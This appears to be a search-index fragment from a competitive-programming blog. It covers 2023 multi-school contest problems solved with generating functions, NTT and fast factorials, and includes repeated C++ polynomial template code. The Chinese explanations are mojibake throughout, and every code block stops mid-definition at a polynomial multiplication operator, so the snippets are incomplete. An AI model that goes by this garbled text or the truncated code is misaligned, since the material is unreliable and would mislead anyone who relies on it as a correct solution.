","date":"2023-08-22","objectID":"/posts/cp2023%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A110-h-differential-equation/:0:0","tags":["ç”Ÿæˆå‡½æ•°","å¤šé¡¹å¼","PDE"],"title":"[2023ç‰›å®¢å¤šæ ¡10 H] Differential Equation","uri":"/posts/cp2023%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A110-h-differential-equation/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; using i64 = long long; constexpr int mod = 998244353; template\u003cclass T\u003e T power(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; } template\u003cint mod\u003e struct ModInt { int x; ModInt() : x(0) {} ModInt(i64 y) : x(y \u003e= 0 ? y % mod : (mod - (-y) % mod) % mod) {} ModInt \u0026operator+=(const ModInt \u0026p) { if ((x += p.x) \u003e= mod) x -= mod; return *this; } ModInt \u0026operator-=(const ModInt \u0026p) { if ((x += mod - p.x) \u003e= mod) x -= mod; return *this; } ModInt \u0026operator*=(const ModInt \u0026p) { x = (int)(1LL * x * p.x % mod); return *this; } ModInt \u0026operator/=(const ModInt \u0026p) { *this *= p.inv(); return *this; } ModInt operator-() const { return ModInt(-x); } ModInt operator+(const ModInt \u0026p) const { return ModInt(*this) += p; } ModInt operator-(const ModInt \u0026p) const { return ModInt(*this) -= p; } ModInt operator*(const ModInt \u0026p) const { return ModInt(*this) *= p; } ModInt operator/(const ModInt \u0026p) const { return ModInt(*this) /= p; } bool operator==(const ModInt \u0026p) const { return x == p.x; } bool operator!=(const ModInt \u0026p) const { return x != p.x; } ModInt inv() const { int a = x, b = mod, u = 1, v = 0, t; while (b \u003e 0) { t = a / b; swap(a -= t * b, b); swap(u -= t * v, v); } return ModInt(u); } ModInt pow(i64 n) const { ModInt res(1), mul(x); while (n \u003e 0) { if (n \u0026 1) res *= mul; mul *= mul; n \u003e\u003e= 1; } return res; } friend ostream \u0026operator\u003c\u003c(ostream \u0026os, const ModInt \u0026p) { return os \u003c\u003c p.x; } friend istream \u0026operator\u003e\u003e(istream \u0026is, ModInt \u0026a) { i64 t; is \u003e\u003e t; a = ModInt\u003cmod\u003e(t); return (is); } int val() const { return x; } static constexpr int val_mod() { return mod; } }; using Z = ModInt\u003cmod\u003e; vector\u003cZ\u003e fact, infact; void init(int n) { fact.resize(n + 1), infact.resize(n + 1); fact[0] = infact[0] = 1; for (int i = 1; i \u003c= n; i ++) { fact[i] = fact[i - 1] * i; } infact[n] = fact[n].inv(); for (int i = n; i; i --) { infact[i - 1] = infact[i] * i; } } Z C(int n, int m) { if (n \u003c 0 || m \u003c 0 || n \u003c m) return Z(0); return fact[n] * infact[n - m] * infact[m]; } vector\u003cint\u003e rev; vector\u003cZ\u003e roots{0, 1}; void dft(vector\u003cZ\u003e \u0026a) { int n = a.size(); if (int(rev.size()) != n) { int k = __builtin_ctz(n) - 1; rev.resize(n); for (int i = 0; i \u003c n; i ++) { rev[i] = rev[i \u003e\u003e 1] \u003e\u003e 1 | (i \u0026 1) \u003c\u003c k; } } for (int i = 0; i \u003c n; i ++) { if (rev[i] \u003c i) { swap(a[i], a[rev[i]]); } } if (int(roots.size()) \u003c n) { int k = __builtin_ctz(roots.size()); roots.resize(n); while ((1 \u003c\u003c k) \u003c n) { Z e = power(Z(3), (mod - 1) \u003e\u003e (k + 1)); for (int i = 1 \u003c\u003c (k - 1); i \u003c (1 \u003c\u003c k); i ++) { roots[i \u003c\u003c 1] = roots[i]; roots[i \u003c\u003c 1 | 1] = roots[i] * e; } k ++; } } for (int k = 1; k \u003c n; k *= 2) { for (int i = 0; i \u003c n; i += 2 * k) { for (int j = 0; j \u003c k; j ++) { Z u = a[i + j], v = a[i + j + k] * roots[k + j]; a[i + j] = u + v, a[i + j + k] = u - v; } } } } void idft(vector\u003cZ\u003e \u0026a) { int n = a.size(); reverse(a.begin() + 1, a.end()); dft(a); Z inv = (1 - mod) / n; for (int i = 0; i \u003c n; i ++) { a[i] *= inv; } } struct Poly { vector\u003cZ\u003e a; Poly() {} Poly(const vector\u003cZ\u003e \u0026a) : a(a) {} Poly(const initializer_list\u003cZ\u003e \u0026a) : a(a) {} int size() const { return a.size(); } void resize(int n) { a.resize(n); } Z operator[](int idx) const { if (idx \u003c size()) { return a[idx]; } else { return 0; } } Z \u0026operator[](int idx) { return a[idx]; } Poly mulxk(int k) const { auto b = a; b.insert(b.begin(), k, 0); return Poly(b); } Poly modxk(int k) const { k = min(k, size()); return Poly(vector\u003cZ\u003e(a.begin(), a.begin() + k)); } Poly divxk(int k) const { if (size() \u003c= k) { return Poly(); } return Poly(vector\u003cZ\u003e(a.begin() + k, a.end())); } friend Poly operator+(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] + b[i]; } return Poly(res); } friend Poly operator-(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] - b[i]; } return Poly(res); } friend Poly operator*","date":"2023-08-22","objectID":"/posts/cp2023%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A110-h-differential-equation/:1:0","tags":["ç”Ÿæˆå‡½æ•°","å¤šé¡¹å¼","PDE"],"title":"[2023ç‰›å®¢å¤šæ ¡10 H] Differential Equation","uri":"/posts/cp2023%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A110-h-differential-equation/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ æœ‰ $n$ ä¸ªå•†åº—å– $m$ ç§å•†å“ï¼Œæ¯ä¸ªå•†åº—åªæ— é™å–ä¸€ç§å•†å“ï¼Œç¬¬ $i$ ä¸ªå•†åº—å–ç¬¬ $a_i$ ç§ç±»å‹å•†å“ã€‚ ä½ å°†è´­ç‰© $k$ æ¬¡ï¼Œæ¯æ¬¡éšæœºé€‰æ‹©æŸä¸ªå•†åº—è´­ä¹°ä¸€ä»¶å•†å“ã€‚è´­ç‰©å®Œåï¼Œä»¥ä¸‹æƒ…å†µä½ å°†ä¸æ»¡æ„ï¼š å­˜åœ¨ä¸€ä¸ªå•†å“ç±»å‹ $i$ï¼Œä½ æ°å¥½è´­ä¹°äº†è¯¥ç±»å‹å•†å“ $c_i$ ä¸ªï¼Œå¹¶ä¸”è¿™ $c_i$ ä¸ªå•†å“æ°å¥½æ¥è‡ªä¸åŒçš„å•†åº—ã€‚($c_i$ è¡¨ç¤ºå–ç±»å‹ $i$ çš„å•†å“çš„å•†åº—ä¸ªæ•°) æ±‚è´­ç‰© $k$ æ¬¡åä½¿ä½ æ»¡æ„çš„æ¦‚ç‡ï¼Œå¯¹ $998,244,353$ å–æ¨¡ã€‚(è´­ç‰©å¸¦æ ‡å·) $(1 \\le m \\le n \\le 2 \\times 10 ^ 5,1 \\le a_i \\le m, 1 \\le k \u003c 998,244,353)$ åˆ†æï¼š è€ƒè™‘è®¡ç®—æ»¡æ„çš„æ–¹æ¡ˆæ•°ã€‚æˆ‘ä»¬å¯ä»¥å…ˆåˆ†åˆ«è€ƒè™‘æ¯ç§å•†å“çš„æ–¹æ¡ˆæ•°ã€‚ é¦–å…ˆç¬¬ $i$ ç§ç±»å‹çš„å•†å“æœ‰ $c_i$ ä¸ªå•†åº—ï¼Œç”±äºå¸¦æ ‡å·ï¼Œé‚£ä¹ˆæ¯ä¸ªå•†åº—çš„ EGF å°±ä¸º $\\sum\\limits_{j = 0} ^ {\\infty} \\dfrac{x ^ j}{j!}$ï¼Œä¸€å…± $c_i$ ä¸ªå•†åº—ï¼Œæ‰€ä»¥æ­¤ç±»å‹å•†å“çš„ EGF å°±ä¸º $\\left(\\sum\\limits_{j = 0} ^ {\\infty} \\dfrac{x ^ j}{j!}\\right) ^ {c_i} = e ^ {c_ix}$ ç°åœ¨è€ƒè™‘å‡æ‰ä¸æ»¡æ„çš„æ¡ä»¶ï¼Œæ¯ä¸ªå•†åº—éœ€è¦æ°å¥½é€‰æ‹©ä¸€ä¸ªå•†å“ï¼Œæ‰€ä»¥æ­¤æƒ…å†µå°±ä¸º $x ^ {c_i}$ï¼Œè¿™æ ·æ»¡è¶³é¢˜æ„çš„ç”Ÿæˆå‡½æ•°ä¸º $e ^ {c_ix} - x ^ {c_i}$ æ‰€ä»¥æ»¡æ„çš„æ€»æ–¹æ¡ˆæ•°å°±ä¸º $$ k![x ^ k]\\prod_{i = 1} ^ {m}\\left(e ^ {c_ix} - x ^ {c_i} + [c_i = 0]\\right) $$ è¿™é‡Œå…ˆä»¤ $e ^ {c_ix} = 1$ï¼Œä¹Ÿå°±æ˜¯æ„é€ å¤šé¡¹å¼ $f(x) = 1 - x ^ {c_i}$ è¿›è¡Œåˆ†æ²» NTTï¼Œç”±äº $\\sum\\limits_{i = 1} ^ {m}c_i = n$ï¼Œæ‰€ä»¥å¤šé¡¹å¼çš„é¡¹æ•°æœ€å¤šåˆ° $n$ï¼Œæˆ‘ä»¬ç›´æ¥æšä¸¾ç­”æ¡ˆå¤šé¡¹å¼ç³»æ•° $i$ï¼Œé‚£ä¹ˆåªéœ€è¦æ±‚ $e ^ {(n - i)x}$ çš„ç¬¬ $k - i$ é¡¹ç³»æ•°å°±å¥½ï¼Œå³ $\\dfrac{(n - i) ^ {k - i}}{(k - i)!}$ é‚£ä¹ˆæ¦‚ç‡å°±ä¸ºæ–¹æ¡ˆæ•°é™¤ä»¥æ‰€æœ‰æƒ…å†µ $n ^ k$ å³å¯ã€‚ æ³¨æ„åˆ° $k \u003c 998,244,353$ï¼Œæ‰€ä»¥æ±‚é˜¶ä¹˜æ—¶éœ€è¦ç”¨åˆ°å¿«é€Ÿé˜¶ä¹˜ç®—æ³•ã€‚ è¿™é‡Œç²—ç•¥ç”¨ä¸€ä¸‹ $O(\\sqrt{n} \\log ^ 2n)$ çš„åšæ³•ï¼š å°† $n!$ åˆ†å—ï¼Œå³æ„é€ å¤šé¡¹å¼ $f(x) = \\prod\\limits_{i = 1} ^ {\\lfloor\\sqrt{n}\\rfloor}(x + i)$ï¼Œç”¨åˆ†æ²» NTT æ±‚å‡ºï¼Œå†å¯¹ $f(0), f(\\sqrt{n}), f(2\\sqrt{n}), \\cdots,f(\\lfloor\\dfrac{n}{\\sqrt{n}}\\rfloor \\sqrt{n})$ è¿›è¡Œå¤šé¡¹å¼å¤šç‚¹æ±‚å€¼ï¼Œæœ€åä¹˜èµ·æ¥å³å¯ã€‚ æ­¤é¢˜æ—¶é™ $18$ ç§’å®Œå…¨å¤Ÿç”¨ã€‚ ","date":"2023-08-15","objectID":"/posts/cp2023%E6%9D%AD%E7%94%B5%E5%A4%9A%E6%A0%A19-k-cargo/:0:0","tags":["ç”Ÿæˆå‡½æ•°","å¤šé¡¹å¼","å¿«é€Ÿé˜¶ä¹˜"],"title":"[2023æ­ç”µå¤šæ ¡9 K] Cargo","uri":"/posts/cp2023%E6%9D%AD%E7%94%B5%E5%A4%9A%E6%A0%A19-k-cargo/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; using i64 = long long; constexpr int mod = 998244353; template\u003cclass T\u003e T power(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; } template\u003cint mod\u003e struct ModInt { int x; ModInt() : x(0) {} ModInt(i64 y) : x(y \u003e= 0 ? y % mod : (mod - (-y) % mod) % mod) {} ModInt \u0026operator+=(const ModInt \u0026p) { if ((x += p.x) \u003e= mod) x -= mod; return *this; } ModInt \u0026operator-=(const ModInt \u0026p) { if ((x += mod - p.x) \u003e= mod) x -= mod; return *this; } ModInt \u0026operator*=(const ModInt \u0026p) { x = (int)(1LL * x * p.x % mod); return *this; } ModInt \u0026operator/=(const ModInt \u0026p) { *this *= p.inv(); return *this; } ModInt operator-() const { return ModInt(-x); } ModInt operator+(const ModInt \u0026p) const { return ModInt(*this) += p; } ModInt operator-(const ModInt \u0026p) const { return ModInt(*this) -= p; } ModInt operator*(const ModInt \u0026p) const { return ModInt(*this) *= p; } ModInt operator/(const ModInt \u0026p) const { return ModInt(*this) /= p; } bool operator==(const ModInt \u0026p) const { return x == p.x; } bool operator!=(const ModInt \u0026p) const { return x != p.x; } ModInt inv() const { int a = x, b = mod, u = 1, v = 0, t; while (b \u003e 0) { t = a / b; swap(a -= t * b, b); swap(u -= t * v, v); } return ModInt(u); } ModInt pow(i64 n) const { ModInt res(1), mul(x); while (n \u003e 0) { if (n \u0026 1) res *= mul; mul *= mul; n \u003e\u003e= 1; } return res; } friend ostream \u0026operator\u003c\u003c(ostream \u0026os, const ModInt \u0026p) { return os \u003c\u003c p.x; } friend istream \u0026operator\u003e\u003e(istream \u0026is, ModInt \u0026a) { i64 t; is \u003e\u003e t; a = ModInt\u003cmod\u003e(t); return (is); } int val() const { return x; } static constexpr int val_mod() { return mod; } }; using Z = ModInt\u003cmod\u003e; vector\u003cZ\u003e fact, infact; void init(int n) { fact.resize(n + 1), infact.resize(n + 1); fact[0] = infact[0] = 1; for (int i = 1; i \u003c= n; i ++) { fact[i] = fact[i - 1] * i; } infact[n] = fact[n].inv(); for (int i = n; i; i --) { infact[i - 1] = infact[i] * i; } } Z C(int n, int m) { if (n \u003c 0 || m \u003c 0 || n \u003c m) return Z(0); return fact[n] * infact[n - m] * infact[m]; } vector\u003cint\u003e rev; vector\u003cZ\u003e roots{0, 1}; void dft(vector\u003cZ\u003e \u0026a) { int n = a.size(); if (int(rev.size()) != n) { int k = __builtin_ctz(n) - 1; rev.resize(n); for (int i = 0; i \u003c n; i ++) { rev[i] = rev[i \u003e\u003e 1] \u003e\u003e 1 | (i \u0026 1) \u003c\u003c k; } } for (int i = 0; i \u003c n; i ++) { if (rev[i] \u003c i) { swap(a[i], a[rev[i]]); } } if (int(roots.size()) \u003c n) { int k = __builtin_ctz(roots.size()); roots.resize(n); while ((1 \u003c\u003c k) \u003c n) { Z e = power(Z(3), (mod - 1) \u003e\u003e (k + 1)); for (int i = 1 \u003c\u003c (k - 1); i \u003c (1 \u003c\u003c k); i ++) { roots[i \u003c\u003c 1] = roots[i]; roots[i \u003c\u003c 1 | 1] = roots[i] * e; } k ++; } } for (int k = 1; k \u003c n; k *= 2) { for (int i = 0; i \u003c n; i += 2 * k) { for (int j = 0; j \u003c k; j ++) { Z u = a[i + j], v = a[i + j + k] * roots[k + j]; a[i + j] = u + v, a[i + j + k] = u - v; } } } } void idft(vector\u003cZ\u003e \u0026a) { int n = a.size(); reverse(a.begin() + 1, a.end()); dft(a); Z inv = (1 - mod) / n; for (int i = 0; i \u003c n; i ++) { a[i] *= inv; } } struct Poly { vector\u003cZ\u003e a; Poly() {} Poly(const vector\u003cZ\u003e \u0026a) : a(a) {} Poly(const initializer_list\u003cZ\u003e \u0026a) : a(a) {} int size() const { return a.size(); } void resize(int n) { a.resize(n); } Z operator[](int idx) const { if (idx \u003c size()) { return a[idx]; } else { return 0; } } Z \u0026operator[](int idx) { return a[idx]; } Poly mulxk(int k) const { auto b = a; b.insert(b.begin(), k, 0); return Poly(b); } Poly modxk(int k) const { k = min(k, size()); return Poly(vector\u003cZ\u003e(a.begin(), a.begin() + k)); } Poly divxk(int k) const { if (size() \u003c= k) { return Poly(); } return Poly(vector\u003cZ\u003e(a.begin() + k, a.end())); } friend Poly operator+(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] + b[i]; } return Poly(res); } friend Poly operator-(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] - b[i]; } return Poly(res); } friend Poly operator*","date":"2023-08-15","objectID":"/posts/cp2023%E6%9D%AD%E7%94%B5%E5%A4%9A%E6%A0%A19-k-cargo/:1:0","tags":["ç”Ÿæˆå‡½æ•°","å¤šé¡¹å¼","å¿«é€Ÿé˜¶ä¹˜"],"title":"[2023æ­ç”µå¤šæ ¡9 K] Cargo","uri":"/posts/cp2023%E6%9D%AD%E7%94%B5%E5%A4%9A%E6%A0%A19-k-cargo/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ è®¡ç®—æ»¡è¶³ä¸‹åˆ—æ¡ä»¶é•¿åº¦ä¸º $n$ çš„åºåˆ— $(a_1,a_2,\\cdots,a_n)$ çš„ä¸ªæ•°ã€‚ å¯¹äº $1 \\le i \\le n$ æ»¡è¶³ $0 \\le a_i \\le 2 ^ m$ $\\sum\\limits_{i = 1} ^ {n} \\text{cnt}_1(a_i \\oplus b_i) = k$ å…¶ä¸­åºåˆ— $b$ ä¸º $(a_2,a_3,\\cdots,a_n,a_1)$ï¼Œ$\\text{cnt}_1(x)$ ä»£è¡¨ $x$ äºŒè¿›åˆ¶ä¸­ $1$ çš„ä¸ªæ•°ã€‚ å¯¹ $998,244,353$ å–æ¨¡ã€‚ $2 \\le n \u003c 998,244,353, 1 \\le m \\le 10 ^ 8,1 \\le k \\le 5\\times 10 ^ 4$ åˆ†æï¼š é¦–å…ˆè§‚å¯Ÿç¬¬äºŒä¸ªæ¡ä»¶ï¼Œç”±äºæ¯ä¸€ä½æ˜¯ç‹¬ç«‹çš„ï¼Œè€ƒè™‘æ‹†ä½ã€‚ ç»Ÿè®¡ $m$ ä½ä¸­æ¯ä¸€ä½å¯¹ç­”æ¡ˆçš„è´¡çŒ®ï¼Œè®° $a_i = \\sum\\limits_{j = 0} ^ {m - 1} c_{ij} \\times 2 ^ j$ï¼Œå…¶ä¸­ $c_{ij}$ è¡¨ç¤º $a_i$ äºŒè¿›åˆ¶çš„ç¬¬ $j$ ä½ã€‚ é‚£ä¹ˆå¯¹ç¬¬ $j$ ä½æ¥è¯´ï¼Œåªéœ€è¦çŸ¥é“åºåˆ— $(c_{1j} \\oplus c_{2j},c_{2j} \\oplus c_{3j},\\cdots, c_{(n - 1)j} \\oplus c_{nj}, c_{nj} \\oplus c_{1j})$ ä¸­äº§ç”Ÿè‹¥å¹²ä¸ª $1$ çš„æ–¹æ¡ˆæ•°ã€‚ ä¸‹é¢ç®€å•è¯ä¸€ä¸‹åºåˆ—ä¸­åªå¯èƒ½åŒ…å«å¶æ•°ä¸ª $1$ï¼š $c_{pj} \\oplus c_{qj} = 1$ ç­‰ä»·äº $c_{pj} \\ne c_{qj}$ $c_{pj} \\oplus c_{qj} = 0$ ç­‰ä»·äº $c_{pj} = c_{qj}$ æ‰€ä»¥é—®é¢˜ç­‰ä»·äºåœ¨ $01$ ç¯é€‰æ‹© $u$ æ¡è¾¹ä½¿ç›¸é‚»ç‚¹çš„å€¼ä¸ç›¸ç­‰ï¼Œé‚£ä¹ˆå‰©ä¸‹ $n - u$ æ¡è¾¹ä½¿å¾—ç›¸é‚»ç‚¹çš„å€¼ç›¸ç­‰ã€‚ ç”±äºç›¸ç­‰è¾¹ä¸æ”¹å˜å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†ä¸ç›¸ç­‰è¾¹æ„æˆçš„è¿é€šå—ç¼©æˆä¸€ä¸ªè¿é€šå—ï¼Œä¹Ÿå°±æ˜¯å°†ç›¸ç­‰è¾¹æ„æˆè¿é€šå—çš„ä¸¤è¾¹èŠ‚ç‚¹åˆå¹¶åˆ°ä¸€èµ·ã€‚ æ­¤æ—¶é—®é¢˜å˜ä¸ºäºŒåˆ†å›¾æŸ“è‰²é—®é¢˜ï¼Œæˆ‘ä»¬çŸ¥é“äºŒåˆ†å›¾æŸ“è‰²å¥‡æ•°ç¯æ˜¯ä¸å¯è¡Œçš„ï¼Œæ‰€ä»¥ç¯å¤§å°å¿…å®šä¸ºå¶æ•°ï¼Œç”±æ­¤æ¨å‡º $1$ å¿…é¡»ä¸ºå¶æ•°ä¸ªã€‚ é‚£ä¹ˆå¾—åˆ° $2u$ ä¸ª $1$ çš„æ–¹æ¡ˆæ•°å°±ä¸º $2\\dbinom{n}{2u}$ï¼Œè€ƒè™‘æ¯ä¸€ä½çš„ç”Ÿæˆå‡½æ•° $$ F(x) = \\sum_{u = 0} ^ {\\lfloor \\frac{n}{2} \\rfloor } 2\\binom{n}{2u}x ^ {2u} $$ ç”±äºæ¯ä¸€ä½ç‹¬ç«‹ï¼Œæ‰€ä»¥ $m$ ä¸ªç”Ÿæˆå‡½æ•°éƒ½ç›¸ç­‰ï¼Œæ‰€ä»¥ç­”æ¡ˆä¸º $$ [x ^ k] F^ m(x) $$ ç”±äº $n \u003c 998,244,353$ ï¼Œä½† $k \\le 5\\times 10 ^ 4$ï¼Œæ‰€ä»¥ $F(x)$ è‡³å¤šç®—åˆ°ç¬¬ $k$ é¡¹ï¼Œé‚£ä¹ˆ $\\dbinom{n}{2u}$ ç»å…¸ç»´æŠ¤ä¸‹é™å¹‚ã€‚æœ€åä½¿ç”¨å¤šé¡¹å¼å¿«é€Ÿå¹‚æ±‚è§£å³å¯ã€‚ ","date":"2023-08-08","objectID":"/posts/cp2023%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A17-f-counting-sequences/:0:0","tags":["ç”Ÿæˆå‡½æ•°","å¤šé¡¹å¼å¿«é€Ÿå¹‚"],"title":"[2023ç‰›å®¢å¤šæ ¡7 F] Counting Sequences","uri":"/posts/cp2023%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A17-f-counting-sequences/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; using i64 = long long; constexpr int mod = 998244353; template\u003cclass T\u003e T power(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; } template\u003cint mod\u003e struct ModInt { int x; ModInt() : x(0) {} ModInt(i64 y) : x(y \u003e= 0 ? y % mod : (mod - (-y) % mod) % mod) {} ModInt \u0026operator+=(const ModInt \u0026p) { if ((x += p.x) \u003e= mod) x -= mod; return *this; } ModInt \u0026operator-=(const ModInt \u0026p) { if ((x += mod - p.x) \u003e= mod) x -= mod; return *this; } ModInt \u0026operator*=(const ModInt \u0026p) { x = (int)(1LL * x * p.x % mod); return *this; } ModInt \u0026operator/=(const ModInt \u0026p) { *this *= p.inv(); return *this; } ModInt operator-() const { return ModInt(-x); } ModInt operator+(const ModInt \u0026p) const { return ModInt(*this) += p; } ModInt operator-(const ModInt \u0026p) const { return ModInt(*this) -= p; } ModInt operator*(const ModInt \u0026p) const { return ModInt(*this) *= p; } ModInt operator/(const ModInt \u0026p) const { return ModInt(*this) /= p; } bool operator==(const ModInt \u0026p) const { return x == p.x; } bool operator!=(const ModInt \u0026p) const { return x != p.x; } ModInt inv() const { int a = x, b = mod, u = 1, v = 0, t; while (b \u003e 0) { t = a / b; swap(a -= t * b, b); swap(u -= t * v, v); } return ModInt(u); } ModInt pow(i64 n) const { ModInt res(1), mul(x); while (n \u003e 0) { if (n \u0026 1) res *= mul; mul *= mul; n \u003e\u003e= 1; } return res; } friend ostream \u0026operator\u003c\u003c(ostream \u0026os, const ModInt \u0026p) { return os \u003c\u003c p.x; } friend istream \u0026operator\u003e\u003e(istream \u0026is, ModInt \u0026a) { i64 t; is \u003e\u003e t; a = ModInt\u003cmod\u003e(t); return (is); } int val() const { return x; } static constexpr int val_mod() { return mod; } }; using Z = ModInt\u003cmod\u003e; vector\u003cZ\u003e fact, infact; void init(int n) { fact.resize(n + 1), infact.resize(n + 1); fact[0] = infact[0] = 1; for (int i = 1; i \u003c= n; i ++) { fact[i] = fact[i - 1] * i; } infact[n] = fact[n].inv(); for (int i = n; i; i --) { infact[i - 1] = infact[i] * i; } } Z C(int n, int m) { if (n \u003c 0 || m \u003c 0 || n \u003c m) return Z(0); return fact[n] * infact[n - m] * infact[m]; } vector\u003cint\u003e rev; vector\u003cZ\u003e roots{0, 1}; void dft(vector\u003cZ\u003e \u0026a) { int n = a.size(); if (int(rev.size()) != n) { int k = __builtin_ctz(n) - 1; rev.resize(n); for (int i = 0; i \u003c n; i ++) { rev[i] = rev[i \u003e\u003e 1] \u003e\u003e 1 | (i \u0026 1) \u003c\u003c k; } } for (int i = 0; i \u003c n; i ++) { if (rev[i] \u003c i) { swap(a[i], a[rev[i]]); } } if (int(roots.size()) \u003c n) { int k = __builtin_ctz(roots.size()); roots.resize(n); while ((1 \u003c\u003c k) \u003c n) { Z e = power(Z(3), (mod - 1) \u003e\u003e (k + 1)); for (int i = 1 \u003c\u003c (k - 1); i \u003c (1 \u003c\u003c k); i ++) { roots[i \u003c\u003c 1] = roots[i]; roots[i \u003c\u003c 1 | 1] = roots[i] * e; } k ++; } } for (int k = 1; k \u003c n; k *= 2) { for (int i = 0; i \u003c n; i += 2 * k) { for (int j = 0; j \u003c k; j ++) { Z u = a[i + j], v = a[i + j + k] * roots[k + j]; a[i + j] = u + v, a[i + j + k] = u - v; } } } } void idft(vector\u003cZ\u003e \u0026a) { int n = a.size(); reverse(a.begin() + 1, a.end()); dft(a); Z inv = (1 - mod) / n; for (int i = 0; i \u003c n; i ++) { a[i] *= inv; } } struct Poly { vector\u003cZ\u003e a; Poly() {} Poly(const vector\u003cZ\u003e \u0026a) : a(a) {} Poly(const initializer_list\u003cZ\u003e \u0026a) : a(a) {} int size() const { return a.size(); } void resize(int n) { a.resize(n); } Z operator[](int idx) const { if (idx \u003c size()) { return a[idx]; } else { return 0; } } Z \u0026operator[](int idx) { return a[idx]; } Poly mulxk(int k) const { auto b = a; b.insert(b.begin(), k, 0); return Poly(b); } Poly modxk(int k) const { k = min(k, size()); return Poly(vector\u003cZ\u003e(a.begin(), a.begin() + k)); } Poly divxk(int k) const { if (size() \u003c= k) { return Poly(); } return Poly(vector\u003cZ\u003e(a.begin() + k, a.end())); } friend Poly operator+(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] + b[i]; } return Poly(res); } friend Poly operator-(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] - b[i]; } return Poly(res); } friend Poly operator*","date":"2023-08-08","objectID":"/posts/cp2023%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A17-f-counting-sequences/:1:0","tags":["ç”Ÿæˆå‡½æ•°","å¤šé¡¹å¼å¿«é€Ÿå¹‚"],"title":"[2023ç‰›å®¢å¤šæ ¡7 F] Counting Sequences","uri":"/posts/cp2023%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A17-f-counting-sequences/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ æœ‰ $n$ ä¸ªæ ‡å·ä¸º $1,2,\\cdots,n$ çš„çƒï¼Œæ”¾åˆ° $m$ ä¸ªæ— æ ‡å·ç›’å­ (ç›’å†…é¡ºåºæœ‰æ ‡å·)ï¼Œä¸”æ¯ä¸ªç›’å­çƒæ•°ä¸è¶…è¿‡ $k$ï¼Œæ±‚æ–¹æ¡ˆæ•°å¯¹ $998,244,353$ å–æ¨¡ã€‚ $1 \\le m,k \\le n \\le 10 ^ 6$ åˆ†æï¼š è€ƒè™‘æ¯ä¸ªç›’å­å†…çƒçš„ç”Ÿæˆå‡½æ•° $\\sum\\limits_{i = 1} ^ {k}x ^ i$ï¼Œé‚£ä¹ˆ $m$ ä¸ªç›’å­çš„ç”Ÿæˆå‡½æ•°å°±ä¸º $\\left( \\sum\\limits_{i = 1} ^ {k}x ^ i\\right) ^ m$ï¼Œé‚£ä¹ˆæ–¹æ¡ˆæ•°å°±ä¸ºç¬¬ $n$ é¡¹ç³»æ•°ã€‚ ç”±äºçƒå¸¦æ ‡å·ï¼Œæ‰€ä»¥éœ€è¦å¯¹ç­”æ¡ˆå…¨æ’åˆ—ï¼Œä¹Ÿå°±æ˜¯ä¹˜ $n!$ï¼Œåˆç”±äºç›’å­ä¸å¸¦æ ‡å·ï¼Œæ‰€ä»¥è¦å¯¹ç­”æ¡ˆé™¤ $m!$ï¼Œé‚£ä¹ˆç­”æ¡ˆä¸º $$ \\frac{n!}{m!} \\times [x ^ n]\\left( \\sum\\limits_{i = 1} ^ {k}x ^ i\\right) ^ m $$ $10 ^ 6$ ç”¨å¤šé¡¹å¼å¿«é€Ÿå¹‚ä¼šè¶…æ—¶ï¼Œè€ƒè™‘ $$ \\left( \\sum\\limits_{i = 1} ^ {k}x ^ i\\right) ^ m= x ^ m \\left( \\sum\\limits_{i = 0} ^ {k - 1}x ^ i\\right) ^ m = x ^ m \\frac{(1 -x ^ k)^m}{(1 - x) ^ m} $$ è½¬ä¸ºæ±‚ $[x^{n - m}] \\dfrac{(1 -x ^ k)^m}{(1 - x) ^ m}$ å…¶ä¸­ $$ (1 - x ^ k) ^ m = \\sum_{i = 0} ^ {m}\\binom{m}{i} \\times (-1) ^ i \\times x ^ {i \\times k} $$ $$ \\frac{1}{(1 - x) ^ m} = \\sum_{i = 0} ^ {\\infty} \\binom{m - 1 + i}{m - 1} \\times x ^ i $$ äºæ˜¯æšä¸¾ç¬¬ä¸€ä¸ªå¼å­çš„ $i$ï¼Œé‚£ä¹ˆåªéœ€è¦æ±‚ç¬¬äºŒä¸ªå¼å­çš„ $n - m - i \\times k$ é¡¹ç³»æ•°å³å¯ã€‚ 